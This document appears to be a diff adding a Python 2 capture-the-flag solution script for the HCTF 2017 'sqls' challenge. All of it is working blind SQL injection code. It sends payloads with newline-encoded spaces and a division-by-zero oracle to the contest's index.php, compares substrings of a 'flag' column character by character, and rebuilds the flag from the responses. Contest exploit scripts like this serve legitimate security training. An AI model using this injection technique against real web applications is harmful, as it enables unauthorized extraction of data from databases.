@@ -1,0 +1,60 @@
+import requests
+import string
+
+letters = string.letters
+printable = string.printable
+custom = string.digits+string.letters+'_'+'!'
+flag_len = 41
+# whatzuzn33dz1szunderzm3 <-- length(flag)=23
+
+def toHex(s):
+    lst = []
+    for ch in s:
+        hv = hex(ord(ch)).replace('0x', '')
+        if len(hv) == 1:
+            hv = '0'+hv
+        lst.append(hv)
+
+    return reduce(lambda x,y:x+y, lst)
+
+def guess(c, offset):
+    r1 = requests.get('http://sqls.2017.hctf.io/index/index.php?id=1/(1/(select%0a{}=ascii(substr(reverse(substr(flag%0afrom%0a{}))%0afrom%0a{}))%0afrom%0aflag%0awhere%0alength(flag)={}))'
+            .format(
+                ord(c),
+                offset,
+                flag_len + 1 - offset,
+                flag_len)
+            )
+    if 'Alice' in r1.text:
+        return True
+    return False
+
+if __name__ == '__main__':
+    flag = './h3llo_111y_fr13nds_w3lc0me_t0_hctf2017/.'
+    exact = ''
+    for i in range(1, len(flag)+1):
+        c = flag[i-1]
+        print 'Guessing {}-th char: {}'.format(i, c)
+        if c.upper() == c:
+            if guess(c, i):
+                exact += c
+            else:
+                print 'None match!!!'
+                for s in printable:
+                    if guess(s, i):
+                        print 'Found new match: ', s
+                        exact += s
+                        break
+        if not c.upper() == c:
+            if guess(c.upper(), i):
+                exact += c.upper()
+            elif guess(c, i):
+                exact += c
+            else:
+                print 'None match!!!'
+                for s in printable:
+                    if guess(s, i):
+                        print 'Found new match: ', s
+                        exact += s
+                        break
+        print exact
